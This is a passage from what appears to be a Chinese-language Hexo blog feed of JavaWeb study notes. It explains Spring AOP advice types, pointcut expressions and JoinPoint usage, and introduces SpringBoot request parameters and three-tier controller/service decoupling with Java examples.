class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>编写AOP程序：对于特定方法根据业务需要进行编程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Component</span>  <span class="hljs-comment">//交给AOP管理</span><br><span class="hljs-comment">//@Aspect //AOP类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimeAspect</span> &#123;<br><br>    <span class="hljs-comment">//@Around(&quot;execution(* com.itheima.service.impl.DeptServiceImpl.*(..))&quot;) //切入点表达式</span><br>    <span class="hljs-meta">@Around(&quot;com.itheima.aop.MyAspect1.pt()&quot;)</span> <span class="hljs-comment">//接入点表达式 //设置哪些方法需要统计耗时</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">recordTime</span><span class="hljs-params">(ProceedingJoinPoint joinPoint)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-comment">//1. 记录开始时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">begin</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br><br>        <span class="hljs-comment">//2. 调用原始方法运行</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> joinPoint.proceed();<br><br>        <span class="hljs-comment">//3. 记录结束时间, 计算方法执行耗时</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        log.info(joinPoint.getSignature()+<span class="hljs-string">&quot;方法执行耗时: &#123;&#125;ms&quot;</span>, end-begin);<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/JavaWeb/2-2/8.png"></p><h3 id="3、AOP基础"><a href="#3、AOP基础" class="headerlink" title="3、AOP基础"></a>3、AOP基础</h3><p>1.连接点：JoinPoint，可以被 AOP 控制的方法（暗含方法执行时的相关信息）</p><p>2.通知： Advice，指哪些重复的逻辑，也就是共性功能（最终体现为一个方法）</p><p>3.切入点：PointCut，匹配连接点的条件，通知仅会在切入点方法执行时被应用</p><p>4.切面：Aspect，描述通知与切入点的对应关系（通知+切入点）</p><p>5.目标对象：Target，通知所应用的对象</p><p><img src="/img/JavaWeb/2-2/9.png"></p><h3 id="4、AOP执行流程"><a href="#4、AOP执行流程" class="headerlink" title="4、AOP执行流程"></a>4、AOP执行流程</h3><p><img src="/img/JavaWeb/2-2/10.png"></p><h3 id="5、AOP通知类型"><a href="#5、AOP通知类型" class="headerlink" title="5、AOP通知类型"></a>5、AOP通知类型</h3><ol><li>@Around：环绕通知，此注解标注的通知方法在目标方法前、后都被执行</li><li>@Before：前置通知，此注解标注的通知方法在目标方法前被执行</li><li>@After：后置通知，此注解标注的通知方法在目标方法后被执行，无论是否有异常都会执行</li><li>@AfterReturning：返回后通知，此注解标注的通知方法在目标方法后被执行，有异常不会执行</li><li>@AfterThrowing：异常后通知，此注解标注的通知方法发生异常后执行</li></ol><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-comment">//@Aspect</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAspect1</span> &#123;<br><br>    <span class="hljs-meta">@Pointcut(&quot;execution(* com.itheima.service.impl.DeptServiceImpl.*(..))&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pt</span><span class="hljs-params">()</span>&#123;&#125;<br>    <span class="hljs-comment">//该注解的作用是将公共的切点表达式抽取出来，需要用到时引用该切点表达式即可。</span><br><br>    <span class="hljs-meta">@Before(&quot;pt()&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        log.info(<span class="hljs-string">&quot;before ...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Around(&quot;pt()&quot;)</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">around</span><span class="hljs-params">(ProceedingJoinPoint proceedingJoinPoint)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        log.info(<span class="hljs-string">&quot;around before ...&quot;</span>);<br><br>        <span class="hljs-comment">//调用目标对象的原始方法执行</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> proceedingJoinPoint.proceed();<br><br>        log.info(<span class="hljs-string">&quot;around after ...&quot;</span>);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-meta">@After(&quot;pt()&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        log.info(<span class="hljs-string">&quot;after ...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@AfterReturning(&quot;pt()&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterReturning</span><span class="hljs-params">()</span>&#123;<br>        log.info(<span class="hljs-string">&quot;afterReturning ...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@AfterThrowing(&quot;pt()&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterThrowing</span><span class="hljs-params">()</span>&#123;<br>        log.info(<span class="hljs-string">&quot;afterThrowing ...&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="6、AOP通知顺序"><a href="#6、AOP通知顺序" class="headerlink" title="6、AOP通知顺序"></a>6、AOP通知顺序</h3><h4 id="1-不同切面类中，默认按照切面类的类名字母排序："><a href="#1-不同切面类中，默认按照切面类的类名字母排序：" class="headerlink" title="1.不同切面类中，默认按照切面类的类名字母排序："></a>1.不同切面类中，默认按照切面类的类名字母排序：</h4><p>目标方法前的通知方法：字母排名靠前的先执行</p><p>目标方法后的通知方法：字母排名靠前的后执菏</p><h4 id="2-用-Order-数字-加在切面类上来控制顺序"><a href="#2-用-Order-数字-加在切面类上来控制顺序" class="headerlink" title="2.用@Order(数字)加在切面类上来控制顺序"></a>2.用@Order(数字)加在切面类上来控制顺序</h4><p>令目标方法前的通知方法：数字小的先执行</p><p>目标方法后的通知方法：数字小的后执行</p><h3 id="7、切入点表达式"><a href="#7、切入点表达式" class="headerlink" title="7、切入点表达式"></a>7、切入点表达式</h3><p>切入点表达式：描述切入点方法的一种表达式<br>作用：主要用来决定项目中的哪些方法需要加入通知<br>常见形式 ：</p><ol><li>execution (…) ：根据方法的签名来匹配</li><li>@annotationc(…) ：根据注解匹配</li></ol><h4 id="1-切入点表达式-execution（最常用）"><a href="#1-切入点表达式-execution（最常用）" class="headerlink" title="1.切入点表达式-execution（最常用）"></a>1.切入点表达式-execution（最常用）</h4><p>execution主要根据方法的返回值、包名、类名、方法名、方法参数等信息来匹配，语法为：</p><p><img src="/img/JavaWeb/2-2/11.png"></p><p>其中带?的表示可以省略的部分</p><ul><li>访问修饰符：可省略(比如: public、 protected)</li><li>包名.类名：可省略</li><li>throws异常：可省略(注意是方法上声明抛出的异常，不是实际抛出的异常)</li></ul><p>常用的切入点表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-comment">//@Aspect</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAspect7</span> &#123;<br><br>    <span class="hljs-comment">//匹配DeptServiceImpl中的 list() 和 delete(Integer id)方法</span><br>    <span class="hljs-meta">@Pointcut(&quot;execution(* com.itheima.service.DeptService.list()) || execution(* com.itheima.service.DeptService.delete(java.lang.Integer))&quot;)</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pt</span><span class="hljs-params">()</span>&#123;&#125;<br><br>    <span class="hljs-meta">@Before(&quot;pt()&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        log.info(<span class="hljs-string">&quot;MyAspect7 ... before ...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以使用通配符描述切入点：</p><p>单个独立的任意符号，可以通配任意返回值、包名、类名、方法名、任意类型的一个参数,也可以通配包、类、方法名的一部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">execution(* com.*. service.*.update*(*))<br></code></pre></td></tr></table></figure><p>多个连续的任意符号，可以通配任意层级的包，或任意类型、任意个数的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">execution(* com.itheima..DeptService.*(..))<br></code></pre></td></tr></table></figure><p>注意事项</p><p>根据业务需要，可以使用且(&amp;&amp;)、或(|)、非(!)来组合比较复杂的切入点表达式。</p><h4 id="2-切入点表达式-annotation（多一步，但灵活）"><a href="#2-切入点表达式-annotation（多一步，但灵活）" class="headerlink" title="2.切入点表达式-@annotation（多一步，但灵活）"></a>2.切入点表达式-@annotation（多一步，但灵活）</h4><p>@annotation 切入点表达式，用于匹配标识有特定注解的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@annotation(com.itheima.anno.Log)</span><br></code></pre></td></tr></table></figure><p>(1)编写一个注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(ElementType.METHOD)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> MyLog &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2)将方法添加注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-comment">//@Aspect</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAspect7</span> &#123;<br>    <span class="hljs-comment">//匹配DeptServiceImpl中的 list() 和 delete(Integer id)方法</span><br>    <span class="hljs-comment">//@Pointcut(&quot;execution(* com.itheima.service.DeptService.list()) || execution(* com.itheima.service.DeptService.delete(java.lang.Integer))&quot;)</span><br>    <span class="hljs-meta">@Pointcut(&quot;@annotation(com.itheima.aop.MyLog)&quot;)</span><br>    <span class="hljs-comment">//替换成@annotation</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pt</span><span class="hljs-params">()</span>&#123;&#125;<br><br>    <span class="hljs-meta">@Before(&quot;pt()&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        log.info(<span class="hljs-string">&quot;MyAspect7 ... before ...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8、连接点及其相关信息"><a href="#8、连接点及其相关信息" class="headerlink" title="8、连接点及其相关信息"></a>8、连接点及其相关信息</h3><p>在Spring中用JoinPoint抽象了连接点，用它可以获得方法执行时的相关信息，如目标类名、方法名、方法参数等。</p><p>对于@Around 通知，获取连接点信息只能使用ProceedingJoinPoint</p><p>对于其他四种通知，获取连接点信息只能使用JoinPoilt，它是ProceedingJoinPoint的父类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Aspect</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAspect8</span> &#123;<br><br>    <span class="hljs-meta">@Pointcut(&quot;execution(* com.itheima.service.DeptService.*(..))&quot;)</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pt</span><span class="hljs-params">()</span>&#123;&#125;<br><br>    <span class="hljs-meta">@Before(&quot;pt()&quot;)</span><br>    <span class="hljs-comment">// (JoinPoint joinPoint)获取连接点信息</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">(JoinPoint joinPoint)</span>&#123;<br>        log.info(<span class="hljs-string">&quot;MyAspect8 ... before ...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Around(&quot;pt()&quot;)</span><br>    <span class="hljs-comment">// (ProceedingJoinPoint joinPoint)获取连接点信息</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">around</span><span class="hljs-params">(ProceedingJoinPoint joinPoint)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        log.info(<span class="hljs-string">&quot;MyAspect8 around before ...&quot;</span>);<br><br>        <span class="hljs-comment">//1. 获取 目标对象的类名 .</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> joinPoint.getTarget().getClass().getName();<br>        log.info(<span class="hljs-string">&quot;目标对象的类名:&#123;&#125;&quot;</span>, className);<br><br>        <span class="hljs-comment">//2. 获取 目标方法的方法名 .</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> joinPoint.getSignature().getName();<br>        log.info(<span class="hljs-string">&quot;目标方法的方法名: &#123;&#125;&quot;</span>,methodName);<br><br>        <span class="hljs-comment">//3. 获取 目标方法运行时传入的参数 .</span><br>        Object[] args = joinPoint.getArgs();<br>        log.info(<span class="hljs-string">&quot;目标方法运行时传入的参数: &#123;&#125;&quot;</span>, Arrays.toString(args));<br><br>        <span class="hljs-comment">//4. 放行 目标方法执行 .</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> joinPoint.proceed();<br><br>        <span class="hljs-comment">//5. 获取 目标方法运行的返回值 .</span><br>        log.info(<span class="hljs-string">&quot;目标方法运行的返回值: &#123;&#125;&quot;</span>,result);<br><br>        log.info(<span class="hljs-string">&quot;MyAspect8 around after ...&quot;</span>);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="9、AOP案例"><a href="#9、AOP案例" class="headerlink" title="9、AOP案例"></a>9、AOP案例</h3><p>【稍后更新】</p><h2 id="九、SpringBoot原理与Bean管理"><a href="#九、SpringBoot原理与Bean管理" class="headerlink" title="九、SpringBoot原理与Bean管理"></a>九、SpringBoot原理与Bean管理</h2><h3 id="1、配置优先级"><a href="#1、配置优先级" class="headerlink" title="1、配置优先级"></a>1、配置优先级</h3><h3 id="2、Bean-管理"><a href="#2、Bean-管理" class="headerlink" title="2、Bean 管理"></a>2、Bean 管理</h3><h3 id="3、SpringBoot原理"><a href="#3、SpringBoot原理" class="headerlink" title="3、SpringBoot原理"></a>3、SpringBoot原理</h3><h2 id="十、Maven高级"><a href="#十、Maven高级" class="headerlink" title="十、Maven高级"></a>十、Maven高级</h2>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb基础2-1</title>
    <link href="/2023/05/29/JavaWeb_2_1/"/>
    <url>/2023/05/29/JavaWeb_2_1/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaWeb基础2-1"><a href="#JavaWeb基础2-1" class="headerlink" title="JavaWeb基础2-1"></a>JavaWeb基础2-1</h1><h2 id="一、SpringBoot"><a href="#一、SpringBoot" class="headerlink" title="一、SpringBoot"></a>一、SpringBoot</h2><h3 id="1、Spring"><a href="#1、Spring" class="headerlink" title="1、Spring"></a>1、Spring</h3><p>Spring官网：<a href="https://spring.io/">https://spring.io/</a></p><p>Spring当中的各种框架：<a href="https://spring.io/projects">https://spring.io/projects</a></p><p>Spring 发展到今天已经形成了一种开发生态圈，Spring 提供了若干个子项目，每个项目用于完成特定的功能。</p><p>基本都基于Spring Framework框架</p><p><img src="/img/JavaWeb/2-1/1.png"></p><h3 id="2、SpringBoot"><a href="#2、SpringBoot" class="headerlink" title="2、SpringBoot"></a>2、SpringBoot</h3><h4 id="1-基础"><a href="#1-基础" class="headerlink" title="1.基础"></a>1.基础</h4><p>Spring Boot可以帮助我们非常快速的构建应用程序、简化开发、提高效率。</p><p>构建的时候，选择Spring框架，选择Web，完成框架搭建。</p><p>使用SpringBoot的相关简单方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.springboot_start.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;hello world~&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello world&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="2-传输参数"><a href="#2-传输参数" class="headerlink" title="2.传输参数"></a>2.传输参数</h4><h5 id="数组集合参数："><a href="#数组集合参数：" class="headerlink" title="数组集合参数："></a>数组集合参数：</h5><p>数组 ： 请求参数名与形参中数组变量名相同 ， 可以直接使用数组封装<br>集合 ： 请求参数名与形参中集合变量名相同 ， 通过@RequestParam绑定参数关系</p><h5 id="日期参数："><a href="#日期参数：" class="headerlink" title="日期参数："></a>日期参数：</h5><p>使用注解完成日期参数格式转换@DateTimeFormat</p><h5 id="JSON参数："><a href="#JSON参数：" class="headerlink" title="JSON参数："></a>JSON参数：</h5><p>JSON参数：JSON数据键名与形参对象属性名相同，定义pojo类型形参即可接收参数，需要使用@RequestBody标识</p><p><img src="/img/JavaWeb/2-1/2.png"></p><h5 id="路径参数："><a href="#路径参数：" class="headerlink" title="路径参数："></a>路径参数：</h5><p>路径参数：通过请求 URL 直接传递参数，使用 {…} 来标识该路径参数，需要使用 @PathVariable获取路径参数</p><p><img src="/img/JavaWeb/2-1/3.png"></p><h5 id="案例："><a href="#案例：" class="headerlink" title="案例："></a>案例：</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h5 id="请求参数总结："><a href="#请求参数总结：" class="headerlink" title="请求参数总结："></a>请求参数总结：</h5><p><img src="/img/JavaWeb/2-1/4.png"></p><h5 id="统一响应结果："><a href="#统一响应结果：" class="headerlink" title="统一响应结果："></a>统一响应结果：</h5><p>让前后端接受的数据类型只有一种</p><p><img src="/img/JavaWeb/2-1/5.png"></p><h2 id="二、分层解耦"><a href="#二、分层解耦" class="headerlink" title="二、分层解耦"></a>二、分层解耦</h2><h3 id="1、三层架构"><a href="#1、三层架构" class="headerlink" title="1、三层架构"></a>1、三层架构</h3><p><img src="/img/JavaWeb/2-1/7.png"></p><h3 id="2、拆分实例"><a href="#2、拆分实例" class="headerlink" title="2、拆分实例"></a>2、拆分实例</h3><h4 id="直接调用相应的服务方法"><a href="#直接调用相应的服务方法" class="headerlink" title="直接调用相应的服务方法"></a>直接调用相应的服务方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmpController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">EmpService</span> <span class="hljs-variable">empService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EmpServiceA</span>();<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/listEmp&quot;)</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">list</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//1.加载解析xml</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getClassLoader().getResource(<span class="hljs-string">&quot;emp.xml&quot;</span>).getFile();<br>        System.out.println(file);<br>        List&lt;Emp&gt; empList = XmlParserUtils.parse(file, Emp.class);<br><br>        <span class="hljs-comment">//2.对数据进行解析</span><br>        empList.stream().forEach(emp -&gt;&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">gender</span> <span class="hljs-operator">=</span> emp.getGender();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;1&quot;</span>.equals(gender)) &#123;<br>                emp.setGender(<span class="hljs-string">&quot;男&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;2&quot;</span>.equals(gender)) &#123;<br>                emp.setGender(<span class="hljs-string">&quot;女&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">job</span> <span class="hljs-operator">=</span> emp.getJob();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;1&quot;</span>.equals(job)) &#123;<br>                emp.setJob(<span class="hljs-string">&quot;讲师&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;2&quot;</span>.equals(job)) &#123;<br>                emp.setJob(<span class="hljs-string">&quot;班主任&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;3&quot;</span>.equals(job)) &#123;<br>                emp.setJob(<span class="hljs-string">&quot;班主任&quot;</span>);<br>            &#125;<br>        &#125;);<br>        <span class="hljs-keyword">return</span> Result.success(empList);<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="拆分为三层构架的方法"><a href="#拆分为三层构架的方法" class="headerlink" title="拆分为三层构架的方法"></a>拆分为三层构架的方法</h4><p>Controller（接受请求，响应数据）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmpController</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">EmpService</span> <span class="hljs-variable">empService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EmpServiceA</span>();<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/listEmp&quot;)</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">list</span><span class="hljs-params">()</span> &#123;<br>        List&lt;Emp&gt; empList = empService.ListEmp();<br>        <span class="hljs-keyword">return</span> Result.success(empList);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Service（逻辑处理）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmpServiceA</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">EmpService</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">EmpDao</span> <span class="hljs-variable">empDao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EmpDaoA</span>();<br>    <span class="hljs-comment">//2.对数据进行解析</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> List&lt;Emp&gt; <span class="hljs-title function_">ListEmp</span><span class="hljs-params">()</span> &#123;<br>        List&lt;Emp&gt; empList = empDao.ListEmp();<br>        empList.stream().forEach(emp -&gt;&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">gender</span> <span class="hljs-operator">=</span> emp.getGender();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;1&quot;</span>.equals(gender)) &#123;<br>                emp.setGender(<span class="hljs-string">&quot;男&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;2&quot;</span>.equals(gender)) &#123;<br>                emp.setGender(<span class="hljs-string">&quot;女&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">String</span> <span 